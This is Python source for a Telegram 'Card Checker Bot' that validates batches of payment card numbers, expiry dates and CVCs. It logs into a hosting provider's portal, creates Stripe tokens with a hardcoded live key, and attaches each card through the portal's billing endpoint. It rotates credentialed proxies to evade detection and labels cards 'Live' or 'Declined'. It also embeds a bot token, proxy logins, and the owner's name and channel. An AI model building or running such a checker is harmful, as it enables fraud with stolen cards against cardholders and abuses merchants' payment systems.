import telebot
import requests
import uuid
import json
import time
import threading
from datetime import datetime
import os
import logging
import re
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple, Any
import traceback
from dataclasses import dataclass, asdict

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============= Bot Configuration =============
BOT_TOKEN = "8334507568:AAEAX1kHSnU5PZXeLsDAkvOsZx6roHMHAr8"
ADMIN_ID = 5895491379
OWNER_NAME = "Mahmoud Saad"
OWNER_USERNAME = "@Moud202212"
OWNER_CHANNEL = "https://t.me/FastSpeedtest"

# Configuration
MAX_THREADS = 5
MAX_RETRIES = 3
REQUEST_TIMEOUT = 30
RATE_LIMIT_DELAY = 1.5
MAX_CARDS_PER_SESSION = 5000

# Proxy Configuration
PROXY_LIST = [
    "82.29.225.10:5865:bxnvwevk:utgavp02z833",
    "82.22.220.181:5536:bxnvwevk:utgavp02z833",
    "82.21.224.74:6430:bxnvwevk:utgavp02z833",
    "82.29.230.232:7073:bxnvwevk:utgavp02z833",
    "82.25.216.145:6987:bxnvwevk:utgavp02z833",
    "82.25.216.194:7036:bxnvwevk:utgavp02z833",
    "82.27.214.60:6402:bxnvwevk:utgavp02z833",
    "82.24.224.197:5553:bxnvwevk:utgavp02z833",
    "82.22.220.108:5463:bxnvwevk:utgavp02z833",
    "23.27.138.233:6334:bxnvwevk:utgavp02z833",
    "82.27.214.95:6437:bxnvwevk:utgavp02z833",
    "82.25.216.4:6846:bxnvwevk:utgavp02z833",
    "82.29.229.73:6428:bxnvwevk:utgavp02z833",
    "82.27.214.211:6553:bxnvwevk:utgavp02z833",
    "23.27.138.159:6260:bxnvwevk:utgavp02z833",
    "82.21.224.16:6372:bxnvwevk:utgavp02z833",
    "82.22.210.43:7885:bxnvwevk:utgavp02z833",
    "82.21.224.151:6507:bxnvwevk:utgavp02z833",
    "82.29.230.237:7078:bxnvwevk:utgavp02z833",
]
CARDS_PER_PROXY = 5
# ============================================

@dataclass
class BinInfo:
    """Data class for BIN information"""
    scheme: str = "Unknown"
    type: str = "Unknown"
    brand: str = "Unknown"
    bank: str = "Unknown Bank"
    country: str = "Unknown"
    country_emoji: str = "🌍"
    category: str = "Unknown"

@dataclass
class CardResult:
    """Data class for card checking results"""
    card: str
    status: str
    message: str
    bin_info: BinInfo
    time_taken: float = 0.0
    response: str = ""
    gateway_response: str = ""

class ProxyManager:
    """Manages proxy rotation"""
    def __init__(self, proxy_list: List[str]):
        self.proxy_list = proxy_list
        self.card_counter = 0
        self.current_proxy = None
        self.lock = threading.Lock()
    
    def get_proxy_dict(self, proxy_string: str) -> Dict[str, str]:
        """Convert proxy string to requests proxy dict"""
        try:
            parts = proxy_string.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_url = f"http://{username}:{password}@{host}:{port}"
                return {
                    'http': proxy_url,
                    'https': proxy_url
                }
        except Exception as e:
            logger.error(f"Proxy parsing error: {e}")
        return None
    
    def get_random_proxy(self) -> Optional[Dict[str, str]]:
        """Get random proxy from list"""
        with self.lock:
            if not self.proxy_list:
                return None
            
            proxy_string = random.choice(self.proxy_list)
            proxy_dict = self.get_proxy_dict(proxy_string)
            
            if proxy_dict:
                logger.info(f"Using proxy: {proxy_string.split(':')[0]}")
            
            return proxy_dict
    
    def should_rotate_proxy(self) -> bool:
        """Check if proxy should be rotated"""
        with self.lock:
            self.card_counter += 1
            if self.card_counter >= CARDS_PER_PROXY:
                self.card_counter = 0
                return True
            return False

class RateLimiter:
    """Simple rate limiter"""
    def __init__(self, delay: float = 1.0):
        self.delay = delay
        self.last_request = 0
    
    def wait(self):
        elapsed = time.time() - self.last_request
        if elapsed < self.delay:
            time.sleep(self.delay - elapsed)
        self.last_request = time.time()

class InputValidator:
    """Validates card inputs and formats"""
    
    @staticmethod
    def validate_card_format(card_line: str) -> Tuple[bool, Optional[Tuple[str, str, str, str]]]:
        """Validate card format and extract components"""
        try:
            # Clean the input
            card_line = card_line.strip().replace(" ", "")
            
            # Check if contains pipe separator
            if "|" not in card_line:
                return False, None
            
            parts = card_line.split("|")
            if len(parts) != 4:
                return False, None
            
            number, month, year, cvc = parts
            
            # Validate card number (13-19 digits)
            if not re.match(r'^\d{13,19}$', number):
                return False, None
            
            # Validate month (01-12)
            if not re.match(r'^(0[1-9]|1[0-2])$', month.zfill(2)):
                return False, None
            
            # Validate year (20XX or XX format)
            if len(year) == 2:
                year = f"20{year}"
            elif len(year) != 4 or not year.startswith("20"):
                return False, None
            
            # Validate CVC (3-4 digits)
            if not re.match(r'^\d{3,4}$', cvc):
                return False, None
            
            return True, (number, month.zfill(2), year, cvc)
            
        except Exception as e:
            logger.error(f"Card validation error: {e}")
            return False, None
    
    @staticmethod
    def extract_cards_from_text(text: str) -> List[str]:
        """Extract valid card formats from text"""
        cards = []
        lines = text.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Try to find card pattern in the line
            card_pattern = r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}'
            matches = re.findall(card_pattern, line)
            
            for match in matches:
                is_valid, _ = InputValidator.validate_card_format(match)
                if is_valid and match not in cards:
                    cards.append(match)
        
        return cards

class CardChecker:
    """Enhanced card checker with better error handling and retries"""
    
    def __init__(self, proxy_manager: ProxyManager):
        self.proxy_manager = proxy_manager
        self.session = requests.Session()
        self.session.timeout = REQUEST_TIMEOUT
        self.logged_in = False
        self.email = None
        self.rate_limiter = RateLimiter(RATE_LIMIT_DELAY)
        self.login_lock = threading.Lock()
        self.current_proxy = None
        
        # Set session headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

    def update_proxy_if_needed(self):
        """Update proxy if rotation is needed"""
        if self.proxy_manager.should_rotate_proxy():
            self.current_proxy = self.proxy_manager.get_random_proxy()
            logger.info("Proxy rotated")

    def get_bin_info(self, card_number: str, retries: int = 3) -> BinInfo:
        """Enhanced BIN info retrieval with fallback and caching"""
        bin_number = card_number[:6]
        
        # Try multiple BIN APIs
        apis = [
            f"https://binlist.io/lookup/{bin_number}",
            f"https://lookup.binlist.net/{bin_number}",
        ]
        
        for api_url in apis:
            for attempt in range(retries):
                try:
                    headers = {
                        "Accept": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    }
                    
                    response = requests.get(api_url, headers=headers, timeout=10, proxies=self.current_proxy)
                    
                    if response.status_code == 200:
                        data = response.json()
                        
                        return BinInfo(
                            scheme=data.get('scheme', '').upper() or self._detect_scheme(card_number),
                            type=data.get('type', '').upper() or "DEBIT",
                            brand=data.get('scheme', '').upper() or self._detect_scheme(card_number),
                            bank=data.get('bank', {}).get('name', '') or "Unknown Bank",
                            country=data.get('country', {}).get('name', '') or "Unknown",
                            country_emoji=data.get('country', {}).get('emoji', '') or "🌍",
                            category=data.get('category', '').upper() or "CLASSIC"
                        )
                
                except Exception as e:
                    logger.warning(f"BIN API attempt {attempt + 1} failed for {api_url}: {e}")
                    if attempt < retries - 1:
                        time.sleep(1)
                    continue
        
        # Fallback to local detection
        return self._get_fallback_bin_info(card_number)
    
    def _detect_scheme(self, card_number: str) -> str:
        """Detect card scheme from number"""
        first_digit = card_number[0]
        first_two = card_number[:2]
        first_four = card_number[:4]
        
        if first_digit == '4':
            return 'VISA'
        elif first_digit == '5' or first_two in ['51', '52', '53', '54', '55']:
            return 'MASTERCARD'
        elif first_two in ['34', '37']:
            return 'AMERICAN EXPRESS'
        elif first_four == '6011':
            return 'DISCOVER'
        else:
            return 'UNKNOWN'
    
    def _get_fallback_bin_info(self, card_number: str) -> BinInfo:
        """Enhanced fallback BIN info"""
        scheme = self._detect_scheme(card_number)
        
        # More sophisticated type detection
        card_type = "DEBIT"
        if scheme in ['AMERICAN EXPRESS']:
            card_type = "CREDIT"
        elif card_number[0] == '5':
            card_type = "CREDIT"
        
        return BinInfo(
            scheme=scheme,
            type=card_type,
            brand=scheme,
            bank="Unknown Bank",
            country="Unknown",
            country_emoji="🌍",
            category="CLASSIC"
        )

    def login_to_portal(self, email: str, password: str) -> bool:
        """Enhanced login with better error handling"""
        with self.login_lock:
            try:
                if self.logged_in:
                    return True
                
                # Clear session
                self.session.cookies.clear()
                
                login_headers = {
                    'Accept': '*/*',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': 'https://portal.budgetvm.com',
                    'Referer': 'https://portal.budgetvm.com/auth/login',
                    'X-Requested-With': 'XMLHttpRequest',
                }

                login_data = {
                    'email': email.strip(),
                    'password': password,
                }

                response = self.session.post(
                    'https://portal.budgetvm.com/auth/login',
                    headers=login_headers,
                    data=login_data,
                    timeout=30,
                    proxies=self.current_proxy
                )
                
                # Check for session cookie
                session_cookie = self.session.cookies.get('ePortalv1')
                
                if session_cookie and len(session_cookie) > 10:
                    self.logged_in = True
                    self.email = email.strip()
                    logger.info(f"Login successful for {email}")
                    return True
                else:
                    logger.error(f"Login failed for {email} - No valid session cookie")
                    return False
                    
            except requests.RequestException as e:
                logger.error(f"Login request failed: {e}")
                return False
            except Exception as e:
                logger.error(f"Login error: {e}")
                return False

    def send_google_ask(self) -> bool:
        """Enhanced Google Ask with retries"""
        if not self.logged_in or not self.email:
            return False
        
        try:
            google_ask_headers = {
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://portal.budgetvm.com',
                'Referer': 'https://portal.budgetvm.com/auth/login',
                'X-Requested-With': 'XMLHttpRequest',
            }

            google_ask_data = {
                'gEmail': self.email,
                'gUniqueask': 'client',
                'gIdask': '120828',
                'setup': '2',
                'email': self.email,
                'gUnique': 'client',
                'gid': '120828',
            }

            response = self.session.post(
                'https://portal.budgetvm.com/auth/googleAsk',
                headers=google_ask_headers,
                data=google_ask_data,
                timeout=30,
                proxies=self.current_proxy
            )
            
            if response.status_code == 200:
                try:
                    resp_json = response.json()
                    return resp_json.get("success") is True
                except json.JSONDecodeError:
                    # Sometimes success is indicated by a specific response text
                    return "success" in response.text.lower()
            
            return False
            
        except Exception as e:
            logger.error(f"GoogleAsk error: {e}")
            return False

    def create_stripe_token(self, card_number: str, exp_month: str, exp_year: str, cvc: str) -> Tuple[Optional[str], Optional[str]]:
        """Enhanced Stripe token creation with better error handling"""
        try:
            # Generate unique identifiers
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())  
            guid = str(uuid.uuid4())

            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }

            # Build form data
            stripe_data = (
                f'time_on_page=45000&'
                f'pasted_fields=number%2Ccvc&'
                f'guid={guid}&'
                f'muid={muid}&'
                f'sid={sid}&'
                f'key=pk_live_7sv0O1D5LasgJtbYpxp9aUbX&'
                f'payment_user_agent=stripe.js%2F78ef418&'
                f'card[name]=John Doe&'
                f'card[address_line1]=123 Main Street&'
                f'card[address_city]=New York&'
                f'card[address_state]=NY&'
                f'card[address_zip]=10001&'
                f'card[address_country]=US&'
                f'card[number]={card_number}&'
                f'card[exp_month]={exp_month}&'
                f'card[exp_year]={exp_year}&'
                f'card[cvc]={cvc}'
            )

            response = requests.post(
                'https://api.stripe.com/v1/tokens',
                headers=stripe_headers,
                data=stripe_data,
                timeout=30,
                proxies=self.current_proxy
            )
            
            if response.status_code == 200:
                resp_json = response.json()
                
                if "id" in resp_json:
                    return resp_json["id"], None
                elif "error" in resp_json:
                    error_msg = resp_json["error"].get("message", "Unknown Stripe error")
                    return None, error_msg
            
            return None, f"HTTP {response.status_code}: Token creation failed"
            
        except requests.RequestException as e:
            return None, f"Network error: {str(e)}"
        except Exception as e:
            return None, f"Token creation error: {str(e)}"

    def test_card(self, card_info: str) -> CardResult:
        """Enhanced card testing with better error handling and response parsing"""
        start_time = time.time()
        
        # Update proxy if needed
        self.update_proxy_if_needed()
        
        # Validate card format
        is_valid, card_parts = InputValidator.validate_card_format(card_info)
        if not is_valid:
            return CardResult(
                card=card_info,
                status='Invalid Format',
                message='Invalid card format. Use: NUMBER|MM|YYYY|CVC',
                bin_info=BinInfo(),
                time_taken=round(time.time() - start_time, 2),
                response='Format validation failed'
            )
        
        card_number, exp_month, exp_year, cvc = card_parts
        
        try:
            # Rate limiting
            self.rate_limiter.wait()
            
            # Get BIN info
            bin_info = self.get_bin_info(card_number)
            
            # Check if logged in
            if not self.logged_in:
                return CardResult(
                    card=card_info,
                    status='Auth Error',
                    message='Not logged in to portal',
                    bin_info=bin_info,
                    time_taken=round(time.time() - start_time, 2),
                    response='Authentication required'
                )
            
            # Create Stripe Token with retries
            token_id = None
            token_error = None
            
            for attempt in range(MAX_RETRIES):
                token_id, token_error = self.create_stripe_token(card_number, exp_month, exp_year, cvc)
                if token_id:
                    break
                elif attempt < MAX_RETRIES - 1:
                    time.sleep(1)
            
            if not token_id:
                return CardResult(
                    card=card_info,
                    status='Token Failed',
                    message=token_error or 'Failed to create Stripe token',
                    bin_info=bin_info,
                    time_taken=round(time.time() - start_time, 2),
                    response=token_error or 'Token creation failed'
                )

            # Test card with gateway
            return self._test_with_gateway(card_info, token_id, bin_info, start_time)
            
        except Exception as e:
            logger.error(f"Card test error for {card_info}: {traceback.format_exc()}")
            return CardResult(
                card=card_info,
                status='System Error',
                message=f'System error: {str(e)}',
                bin_info=bin_info if 'bin_info' in locals() else BinInfo(),
                time_taken=round(time.time() - start_time, 2),
                response=str(e)
            )

    def _test_with_gateway(self, card_info: str, token_id: str, bin_info: BinInfo, start_time: float) -> CardResult:
        """Test card with payment gateway"""
        try:
            card_headers = {
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://portal.budgetvm.com',
                'Referer': 'https://portal.budgetvm.com/MyAccount/MyBilling',
                'X-Requested-With': 'XMLHttpRequest',
            }

            card_data = {
                'stripeToken': token_id,
            }

            response = self.session.post(
                'https://portal.budgetvm.com/MyGateway/Stripe/cardAdd',
                headers=card_headers,
                data=card_data,
                timeout=30,
                proxies=self.current_proxy
            )
            
            time_taken = round(time.time() - start_time, 2)
            response_text = response.text
            
            # Parse response
            status, message = self._parse_gateway_response(response, response_text)
            
            return CardResult(
                card=card_info,
                status=status,
                message=message,
                bin_info=bin_info,
                time_taken=time_taken,
                response=response_text[:500] if len(response_text) > 500 else response_text,
                gateway_response=f"HTTP {response.status_code}"
            )
            
        except requests.RequestException as e:
            return CardResult(
                card=card_info,
                status='Network Error',
                message=f'Gateway connection failed: {str(e)}',
                bin_info=bin_info,
                time_taken=round(time.time() - start_time, 2),
                response=str(e)
            )

    def _parse_gateway_response(self, response, response_text: str) -> Tuple[str, str]:
        """Enhanced response parsing with multiple indicators"""
        try:
            # Try to parse as JSON first
            if response.headers.get('content-type', '').startswith('application/json'):
                resp_json = response.json()
                
                if resp_json.get("success") is True:
                    return 'Approved', 'Card added successfully ✅'
                elif "result" in resp_json:
                    result = resp_json["result"].lower()
                    if "does not support" in result:
                        return 'Declined', 'Gateway Rejected: Risk threshold!'
                    elif "declined" in result or "failed" in result:
                        return 'Declined', f'Card declined: {resp_json.get("result", "Unknown")}'
                    elif "insufficient" in result:
                        return 'Approved', 'Insufficient funds (Live Card) 💳'
                    elif "security" in result:
                        return 'Declined', 'Security check failed'
                
                return 'Unknown', str(resp_json)
        
        except json.JSONDecodeError:
            pass
        
        # Parse text response for known patterns
        response_lower = response_text.lower()
        
        # Success indicators
        if any(indicator in response_lower for indicator in [
            'card added successfully', 'payment method added', 'success'
        ]):
            return 'Approved', 'Card added successfully ✅'
        
        # Specific decline reasons
        if 'incorrect' in response_lower:
            if 'number' in response_lower:
                return 'Declined', 'Invalid card number'
            elif 'security code' in response_lower or 'cvc' in response_lower:
                return 'Declined', 'Invalid CVC'
            elif 'expiration' in response_lower:
                return 'Declined', 'Invalid expiration date'
        
        # General decline indicators
        decline_indicators = [
            'declined', 'failed', 'invalid', 'rejected', 
            'do not honor', 'insufficient funds', 'expired',
            'security violation', 'lost or stolen', 'restricted'
        ]
        
        for indicator in decline_indicators:
            if indicator in response_lower:
                return 'Declined', f'Card {indicator}'
        
        # Error indicators
        if response.status_code >= 500:
            return 'Gateway Error', f'Server error: {response.status_code}'
        elif response.status_code >= 400:
            return 'Request Error', f'Bad request: {response.status_code}'
        
        return 'Unknown Response', f'Unexpected response (HTTP {response.status_code})'

class SessionManager:
    """Manages user sessions and data"""
    
    def __init__(self):
        self.sessions: Dict[int, Dict] = {}
        self.results: Dict[int, Dict] = {}
        self.threads: Dict[int, threading.Thread] = {}
        self.stop_flags: Dict[int, bool] = {}
        self.locks: Dict[int, threading.Lock] = {}
        self.proxy_manager = ProxyManager(PROXY_LIST)
    
    def get_session(self, user_id: int) -> Dict:
        if user_id not in self.sessions:
            self.sessions[user_id] = {
                'checker': CardChecker(self.proxy_manager),
                'logged_in': False,
                'email': None,
                'dashboard_msg_id': None,
                'last_activity': time.time()
            }
        return self.sessions[user_id]
    
    def get_results(self, user_id: int) -> Dict:
        if user_id not in self.results:
            self.results[user_id] = {
                'approved': 0,
                'declined': 0,
                'errors': 0,
                'total': 0,
                'cards': [],
                'start_time': None,
                'end_time': None
            }
        return self.results[user_id]
    
    def get_lock(self, user_id: int) -> threading.Lock:
        if user_id not in self.locks:
            self.locks[user_id] = threading.Lock()
        return self.locks[user_id]
    
    def cleanup_old_sessions(self, max_age: int = 3600):
        """Clean up old inactive sessions"""
        current_time = time.time()
        expired_users = []
        
        for user_id, session in self.sessions.items():
            if current_time - session.get('last_activity', 0) > max_age:
                expired_users.append(user_id)
        
        for user_id in expired_users:
            self.cleanup_user(user_id)
    
    def cleanup_user(self, user_id: int):
        """Clean up specific user data"""
        self.stop_flags[user_id] = True
        
        if user_id in self.threads:
            thread = self.threads[user_id]
            if thread.is_alive():
                # Give thread time to stop gracefully
                thread.join(timeout=5)
            del self.threads[user_id]
        
        # Clean up data structures
        for data_dict in [self.sessions, self.results, self.stop_flags, self.locks]:
            data_dict.pop(user_id, None)

# Initialize managers
session_manager = SessionManager()
bot = telebot.TeleBot(BOT_TOKEN)

class MessageFormatter:
    """Enhanced message formatting"""
    
    @staticmethod
    def format_card_result(result: CardResult, user_id: int) -> str:
        """Format card result with enhanced styling"""
        bin_info = result.bin_info
        
        # Status emoji and text
        if result.status == 'Approved':
            status_emoji = "✅"
            status_text = "Live"
        elif result.status == 'Declined':
            status_emoji = "❌" 
            status_text = "Declined"
        else:
            status_emoji = "⚠️"
            status_text = result.status
        
        message = f"""
↯ [💳] 𝙲𝚊𝚛𝚍 ↯ {result.card}
↯ [{status_emoji}] 𝚂𝚝𝚊𝚝𝚞𝚜 ↯ [ {status_text}]
[🎟️] 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ↯- [{result.message}]
↯ [🔟] 𝚋𝚒𝚗 ↯ {bin_info.scheme} - {bin_info.type} - {bin_info.brand}
[🏦] 𝚋𝚊𝚗𝚔 ↯ {bin_info.bank}
[{bin_info.country_emoji}] 𝚌𝚘𝚞𝚗𝚝𝚛𝚢 ↯ {bin_info.country} [{bin_info.country_emoji}]
↯ [🤺] 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ↯ Live Auth 🥷↯
[🕜] 𝚃𝚊𝚔𝚎𝚗 ↯ [ {result.time_taken}s ] || 𝚁𝚎𝚝𝚛𝚢 ↯- 0
[❤️]𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝙱𝚢 ↯ @{bot.get_me().username} [PRO]
[🥷] ミ★ 𝘖𝘸𝘯𝘦𝘳 ★彡 ↯ - {OWNER_NAME} - 🥷↯
"""
        return message.strip()
    # ============= Bot Handlers =============

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    welcome_text = f"""
🎯 Welcome to Card Checker Bot! 🎯

👤 Owner: {OWNER_NAME}
📢 Channel: {OWNER_CHANNEL}

📋 Commands:
/login - Login to portal
/check - Check cards
/stop - Stop checking
/results - View results

Send cards in format:
4532xxxxxxxx|12|2025|123
"""
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['login'])
def login_command(message):
    msg = bot.reply_to(message, "Please send login credentials in format:\nemail|password")
    bot.register_next_step_handler(msg, process_login)

def process_login(message):
    try:
        user_id = message.from_user.id
        creds = message.text.strip().split('|')
        
        if len(creds) != 2:
            bot.reply_to(message, "❌ Invalid format! Use: email|password")
            return
        
        email, password = creds
        session = session_manager.get_session(user_id)
        checker = session['checker']
        
        bot.reply_to(message, "🔄 Logging in...")
        
        if checker.login_to_portal(email, password):
            session['logged_in'] = True
            session['email'] = email
            bot.reply_to(message, f"✅ Login successful!\nEmail: {email}")
        else:
            bot.reply_to(message, "❌ Login failed! Check credentials.")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ============= Bot Handlers =============

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    welcome_text = f"""
🎯 Welcome to Card Checker Bot! 🎯

👤 Owner: {OWNER_NAME}
📢 Channel: {OWNER_CHANNEL}

📋 Commands:
/login - Login to portal
/check - Check cards
/stop - Stop checking
/results - View results

Send cards in format:
4532xxxxxxxx|12|2025|123
"""
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['login'])
def login_command(message):
    msg = bot.reply_to(message, "Please send login credentials in format:\nemail|password")
    bot.register_next_step_handler(msg, process_login)

def process_login(message):
    try:
        user_id = message.from_user.id
        creds = message.text.strip().split('|')
        
        if len(creds) != 2:
            bot.reply_to(message, "❌ Invalid format! Use: email|password")
            return
        
        email, password = creds
        session = session_manager.get_session(user_id)
        checker = session['checker']
        
        bot.reply_to(message, "🔄 Logging in...")
        
        if checker.login_to_portal(email, password):
            session['logged_in'] = True
            session['email'] = email
            bot.reply_to(message, f"✅ Login successful!\nEmail: {email}")
        else:
            bot.reply_to(message, "❌ Login failed! Check credentials.")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['check'])
def check_command(message):
    user_id = message.from_user.id
    session = session_manager.get_session(user_id)
    
    if not session.get('logged_in'):
        bot.reply_to(message, "❌ Please login first using /login")
        return
    
    msg = bot.reply_to(message, "📤 Send cards to check (one per line):\n4532xxx|12|2025|123")
    bot.register_next_step_handler(msg, process_cards)

def process_cards(message):
    try:
        user_id = message.from_user.id
        session = session_manager.get_session(user_id)
        
        if not session.get('logged_in'):
            bot.reply_to(message, "❌ Please login first!")
            return
        
        cards = InputValidator.extract_cards_from_text(message.text)
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found!")
            return
        
        bot.reply_to(message, f"🔄 Starting check for {len(cards)} cards...")
        
        # Start checking in background thread
        thread = threading.Thread(target=check_cards_batch, args=(user_id, cards))
        thread.daemon = True
        thread.start()
        session_manager.threads[user_id] = thread
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def check_cards_batch(user_id: int, cards: List[str]):
    """Check cards and send results"""
    try:
        session = session_manager.get_session(user_id)
        checker = session['checker']
        results = session_manager.get_results(user_id)
        
        results['start_time'] = time.time()
        results['total'] = len(cards)
        session_manager.stop_flags[user_id] = False
        
        for card in cards:
            if session_manager.stop_flags.get(user_id):
                break
            
            result = checker.test_card(card)
            
            # Update counters
            if result.status == 'Approved':
                results['approved'] += 1
            elif result.status == 'Declined':
                results['declined'] += 1
            else:
                results['errors'] += 1
            
            results['cards'].append(result)
            
            # Send result
            msg = MessageFormatter.format_card_result(result, user_id)
            try:
                bot.send_message(user_id, msg)
            except:
                pass
            
            time.sleep(0.5)
        
        results['end_time'] = time.time()
        
        # Send summary
        summary = f"""
✅ Checking Complete!

📊 Results:
- Approved: {results['approved']}
- Declined: {results['declined']}
- Errors: {results['errors']}
- Total: {results['total']}

⏱️ Time: {round(results['end_time'] - results['start_time'], 2)}s
"""
        bot.send_message(user_id, summary)
        
    except Exception as e:
        logger.error(f"Batch check error: {e}")
        bot.send_message(user_id, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['stop'])
def stop_command(message):
    user_id = message.from_user.id
    session_manager.stop_flags[user_id] = True
    bot.reply_to(message, "⏹️ Stopping checker...")

@bot.message_handler(commands=['results'])
def results_command(message):
    user_id = message.from_user.id
    results = session_manager.get_results(user_id)
    
    if results['total'] == 0:
        bot.reply_to(message, "📊 No results yet!")
        return
    
    summary = f"""
📊 Session Results:

✅ Approved: {results['approved']}
❌ Declined: {results['declined']}
⚠️ Errors: {results['errors']}
📝 Total: {results['total']}
"""
    bot.reply_to(message, summary)

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    bot.reply_to(message, "Use /start to see available commands")

# ============= Start Bot =============
if __name__ == '__main__':
    logger.info("Bot starting...")
    print("🤖 Bot is running...")
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        logger.error(f"Bot error: {e}")
        print(f"❌ Error: {e}")
